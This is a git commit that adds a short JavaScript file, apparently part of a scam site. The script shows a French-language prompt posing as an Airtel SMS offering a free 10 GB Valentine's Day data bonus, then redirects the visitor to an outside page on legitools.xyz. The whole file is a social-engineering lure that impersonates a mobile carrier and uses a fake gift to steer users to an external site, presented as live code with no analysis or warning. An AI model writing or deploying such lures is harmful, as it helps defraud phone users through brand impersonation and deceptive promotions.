23acb7b6f12281a61a909347891b441d8af9739c
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-15 00:44:57 -0800

    Create 10go-gift.com.js

---
+++ 10go-gift.com.js
@@ -0,0 +1,5 @@
+var password = 'Airtel 10 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 10 Go de données gratuites BONUS CADEAU DE SAINT-VALENTIN, veuillez appuyer sur OK pour ACTIVER. ','Airtel 10 Go de données gratuites');
+if (password != 'Airtel 10 Go de données gratuites') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
